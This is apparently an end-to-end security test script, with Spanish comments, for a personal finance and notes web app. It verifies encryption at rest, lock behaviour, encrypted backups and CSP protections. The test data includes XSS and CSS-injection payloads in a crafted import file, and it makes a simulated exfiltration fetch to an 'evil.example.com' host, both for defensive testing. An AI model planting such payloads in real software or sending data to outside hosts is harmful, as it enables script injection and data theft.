import fs from 'node:fs';
import { chromium, devices } from 'playwright';
import { ARTIFACTS, BASE_URL, ok, ORIGIN, skipRecovery, sql } from './helpers.mjs';
const S=ARTIFACTS, URL=BASE_URL, CODE='mi-clave-segura';
const b = await chromium.launch({ channel: 'chromium' });
const ctx = await b.newContext({ ...devices['Pixel 7'], acceptDownloads: true });
const p = await ctx.newPage();
const errs=[]; p.on('pageerror', e=>errs.push(e.message)); p.on('console', m=>{ if(m.type()==='error') errs.push(m.text()); });
p.on('dialog', d=>d.accept());
await p.goto(URL, { waitUntil: 'networkidle' });
// 1) datos antiguos sin cifrar (versión anterior)
await p.evaluate(async () => {
  localStorage.setItem('miGestor.movements', JSON.stringify([{id:'a',type:'expense',amount:45.5,category:'Servicios',description:'Luz secreta',date:'2026-10-01',frequency:'monthly',until:null,reminder:0,createdAt:1}]));
  localStorage.setItem('miGestor.notes', JSON.stringify([{id:'n',title:'Clave wifi',body:'hunter2',color:'yellow',pinned:false,updatedAt:1}]));
  const png = await (await fetch('icons/icon-192.png')).blob();
  await new Promise((res, rej) => { const r=indexedDB.open('mi-gestor'); r.onerror=()=>rej(r.error); r.onupgradeneeded=()=>{ if(!r.result.objectStoreNames.contains('documents')) r.result.createObjectStore('documents',{keyPath:'id'}); }; r.onsuccess=()=>{ const tx=r.result.transaction('documents','readwrite'); tx.objectStore('documents').put({id:'d1',type:'carnet',name:'Carnet Tomas',number:'12345678-9',expiry:'',notes:'',images:[png],createdAt:1}); tx.oncomplete=()=>{r.result.close();res();}; tx.onerror=rej; }; });
});
await p.reload({ waitUntil: 'networkidle' });
ok(await p.getByText('Protege Mi Gestor').isVisible(), 'pide crear código al abrir');
await p.getByPlaceholder(/Código \(mínimo/).fill('123');
await p.getByPlaceholder('Repite el código').fill('123');
await p.getByRole('button', { name: 'Crear código' }).click();
ok(await p.getByText(/al menos 6/).isVisible(), 'rechaza código corto');
await p.getByPlaceholder(/Código \(mínimo/).fill('111111');
ok(await p.getByText(/muy fácil de adivinar/).isVisible(), 'avisa de código débil');
await p.getByPlaceholder(/Código \(mínimo/).fill(CODE);
await p.getByPlaceholder('Repite el código').fill(CODE);
await p.getByRole('button', { name: 'Crear código' }).click(); await skipRecovery(p);
await p.getByRole('heading', { name: 'Inicio' }).waitFor();
await p.getByRole('navigation').getByRole('button', { name: 'Historial' }).click(); ok(await p.getByText('Luz secreta').first().isVisible(), 'datos antiguos migrados y visibles'); await p.getByRole('navigation').getByRole('button', { name: 'Inicio' }).click();
// 2) en disco no queda nada legible
const disk = await p.evaluate(async () => {
  const ls = JSON.stringify(Object.fromEntries(Object.keys(localStorage).map(k=>[k, localStorage.getItem(k)])));
  const dump = await new Promise(res => { const r=indexedDB.open('mi-gestor'); r.onsuccess=async()=>{ const db=r.result; const out={}; for (const s of db.objectStoreNames) { out[s]=await new Promise(rr=>{ const q=db.transaction(s).objectStore(s).getAll(); q.onsuccess=()=>rr(q.result); }); } db.close(); res(out); }; });
  const text = JSON.stringify(dump, (k,v)=> v instanceof ArrayBuffer ? new TextDecoder().decode(v) : (v instanceof Uint8Array ? '[iv]' : v));
  const hasBlob = dump.documents.some(d => (d.images||[]).some(i => i instanceof Blob));
  return { ls, text, hasBlob, docs: dump.documents.length, vault: dump.vault.length };
});
ok(!/Luz secreta|hunter2|Carnet Tomas|12345678/.test(disk.ls + disk.text), 'nada legible en localStorage ni IndexedDB');
ok(!disk.hasBlob && disk.docs===1 && disk.vault>=1, 'fotos guardadas cifradas (sin Blob en claro)');
ok(!/miGestor\.(movements|notes)/.test(disk.ls), 'claves antiguas sin cifrar eliminadas');
ok(!disk.ls.includes(CODE), 'el código no se guarda');
// documento descifrado se ve
await p.getByRole('navigation').getByRole('button', { name: 'Docs' }).click();
await p.waitForSelector('.doc-card img'); ok(true, 'documento migrado se descifra y muestra foto');
await p.locator('.doc-card').click(); await p.getByLabel('Mostrar').click();
ok(await p.getByText('12345678-9').isVisible(), 'número visible al tocar el ojo');
await p.getByLabel('Cerrar').click();
// 3) bloqueo manual
await p.getByLabel('Bloquear').first().click();
ok(await p.getByRole('button', { name: 'Desbloquear' }).isVisible(), 'bloqueo manual');
ok(await p.locator('text=Luz secreta').count()===0, 'al bloquear no queda ningún dato en pantalla');
for (let i=0;i<5;i++){ await p.getByPlaceholder('Código').fill('incorrecto'+i); await p.getByRole('button',{name:/Desbloquear|Abriendo/}).click(); await p.getByText('Código incorrecto.').waitFor(); }
ok(await p.getByText(/Demasiados intentos\. Espera/).isVisible(), 'espera obligatoria tras 5 fallos');
ok(await p.getByRole('button', { name: 'Desbloquear' }).isDisabled(), 'botón desactivado durante la espera');
await p.evaluate(()=>localStorage.removeItem('miGestor.lockout')); await p.reload({ waitUntil: 'networkidle' });
await p.getByPlaceholder('Código').fill(CODE); await p.getByRole('button',{name:'Desbloquear'}).click();
await p.getByRole('heading', { name: 'Inicio' }).waitFor(); ok(true, 'desbloqueo con el código correcto');
// 4) bloqueo automático al salir (modo "Al salir")
await p.getByLabel('Ajustes').click(); await p.getByRole('button',{name:'Al salir'}).click(); await p.getByLabel('Cerrar').click();
await p.evaluate(()=>{ Object.defineProperty(document,'visibilityState',{value:'hidden',configurable:true}); document.dispatchEvent(new Event('visibilitychange')); });
ok(await p.getByRole('button', { name: 'Desbloquear' }).waitFor({timeout:3000}).then(()=>true,()=>false), 'se bloquea al salir de la app');
await p.evaluate(()=>{ Object.defineProperty(document,'visibilityState',{value:'visible',configurable:true}); document.dispatchEvent(new Event('visibilitychange')); });
await p.getByPlaceholder('Código').fill(CODE); await p.getByRole('button',{name:'Desbloquear'}).click(); await p.getByRole('heading', { name: 'Inicio' }).waitFor();
// 4b) elegir una foto da una gracia corta, pero volver mucho después igual bloquea
const vis = (v) => p.evaluate((v)=>{ Object.defineProperty(document,'visibilityState',{value:v,configurable:true}); document.dispatchEvent(new Event('visibilitychange')); }, v);
await p.getByRole('navigation').getByRole('button', { name: 'Docs' }).click(); await p.getByRole('button',{name:'Agregar documento'}).click();
// En Android, al abrir el selector la app pasa a segundo plano y vuelve al elegir (o cancelar).
const [chooser1] = await Promise.all([p.waitForEvent('filechooser'), p.locator('.photo-add').click()]);
await vis('hidden'); await p.waitForTimeout(300); await vis('visible'); await chooser1.setFiles([]);
ok(await p.getByText('Nuevo documento').isVisible(), 'volver al instante del selector de fotos no bloquea');
await Promise.all([p.waitForEvent('filechooser'), p.locator('.photo-add').click()]);
await vis('hidden');
await p.evaluate(()=>{ const real = Date.now.bind(Date); Date.now = () => real() + 60*60*1000; });
await vis('visible');
ok(await p.getByRole('button', { name: 'Desbloquear' }).waitFor({timeout:3000}).then(()=>true,()=>false), 'tras elegir una foto, volver una hora después pide el código');
await p.reload({ waitUntil: 'networkidle' });
await p.getByPlaceholder('Código').fill(CODE); await p.getByRole('button',{name:'Desbloquear'}).click(); await p.getByRole('heading', { name: 'Inicio' }).waitFor();
// 5) copia cifrada
await p.getByLabel('Ajustes').click(); await p.getByRole('button',{name:'Exportar'}).click();
await p.getByPlaceholder(/Contraseña de la copia/).fill('copia-123456'); await p.getByPlaceholder('Repite la contraseña').fill('copia-123456');
const [dl] = await Promise.all([p.waitForEvent('download'), p.getByRole('button',{name:'Descargar copia cifrada'}).click()]);
await dl.saveAs(S+'/backup.json'); const raw=fs.readFileSync(S+'/backup.json','utf8'); const bj=JSON.parse(raw);
ok(bj.encrypted===true && !/Luz secreta|hunter2|12345678|Carnet/.test(raw), 'copia cifrada: sin datos legibles');
await p.waitForTimeout(300); await p.screenshot({ path: S+'/settings.png' });
// archivo manipulado
const evil = { app:'mi-gestor', version:1, movements:[{type:'expense',amount:'1e400',category:'x',date:'2026-13-45'},{type:'hack',amount:5,category:'y',date:'2026-10-01'},{type:'income',amount:10,category:'<img src=x onerror=alert(1)>',date:'2026-10-02',frequency:'evil'}], notes:[{title:'t',body:'b',color:'red; background:url(//evil)'}], documents:[{name:'Doc',type:'x',images:['data:text/html;base64,PHNjcmlwdD4=','javascript:alert(1)']}], categories:{expense:[{}, 'ok']} };
fs.writeFileSync(S+'/evil.json', JSON.stringify(evil));
// 6) importar en otro teléfono
const ctx2 = await b.newContext({ ...devices['Pixel 7'] }); const q = await ctx2.newPage(); q.on('dialog', d=>d.accept());
const errs2=[]; q.on('pageerror', e=>errs2.push(e.message)); q.on('console', m=>{ if(m.type()==='error') errs2.push(m.text()); });
await q.goto(URL, { waitUntil: 'networkidle' });
await q.getByPlaceholder(/Código \(mínimo/).fill('otro-telefono'); await q.getByPlaceholder('Repite el código').fill('otro-telefono'); await q.getByRole('button',{name:'Crear código'}).click(); await skipRecovery(q);
await q.getByRole('heading', { name: 'Inicio' }).waitFor();
await q.getByLabel('Ajustes').click(); await q.getByRole('button',{name:'Importar'}).click();
await q.locator('input[type=file]').setInputFiles(S+'/backup.json');
await q.getByPlaceholder('Contraseña de la copia').fill('equivocada'); await q.getByRole('button',{name:'Restaurar copia'}).click();
await q.getByText('Contraseña incorrecta o archivo dañado.').waitFor(); ok(true, 'copia con contraseña incorrecta rechazada');
await q.getByPlaceholder('Contraseña de la copia').fill('copia-123456'); await q.getByRole('button',{name:'Restaurar copia'}).click();
await q.getByText('Datos restaurados.').waitFor(); await q.getByLabel('Cerrar').click();
await q.getByRole('navigation').getByRole('button', { name: 'Historial' }).click(); ok(await q.getByText('Luz secreta').first().isVisible(), 'copia cifrada restaurada en otro teléfono');
// importar archivo malicioso (sin cifrar)
await q.getByLabel('Ajustes').click(); await q.getByRole('button',{name:'Importar'}).click();
await q.locator('input[type=file]').setInputFiles(S+'/evil.json'); await q.getByText('Datos restaurados.').waitFor(); await q.getByLabel('Cerrar').click();
await q.getByRole('navigation').getByRole('button', { name: 'Historial' }).click();
const rows = await q.locator('.row').count(); const noteClass = await (async()=>{ await q.getByRole('navigation').getByRole('button', { name: 'Notas' }).click(); return q.locator('.note').first().getAttribute('class'); })();
ok(rows===1, 'archivo manipulado: solo entra 1 movimiento válido de 3 (encontrados '+rows+')');
ok(noteClass==='note plain', 'archivo manipulado: color de nota inválido descartado');
await q.getByRole('navigation').getByRole('button', { name: 'Docs' }).click(); await q.waitForSelector('.doc-card');
ok(await q.locator('.doc-card img').count()===0, 'archivo manipulado: imágenes no válidas descartadas');
ok(errs2.length===0, 'sin errores ni violaciones de CSP (2): '+JSON.stringify(errs2));
// 7) clickjacking
const f = await ctx.newPage(); await f.setContent('<iframe src="'+URL+'" width=400 height=400></iframe>'); await f.waitForTimeout(1500);
const ft = await f.frames()[1].locator('#root').textContent(); ok(/no se puede abrir dentro de otra página/.test(ft), 'bloqueado dentro de un iframe');
// 8) CSP bloquea envío de datos a terceros
const blocked = await p.evaluate(async()=>{ try { await fetch('https://evil.example.com/robar'); return false; } catch { return true; } });
ok(blocked, 'CSP impide enviar datos a otro sitio');
ok(errs.filter(e=>!/evil\.example|Content Security Policy.*evil/.test(e)).length===0, 'sin errores en la app: '+JSON.stringify(errs));
await b.close();
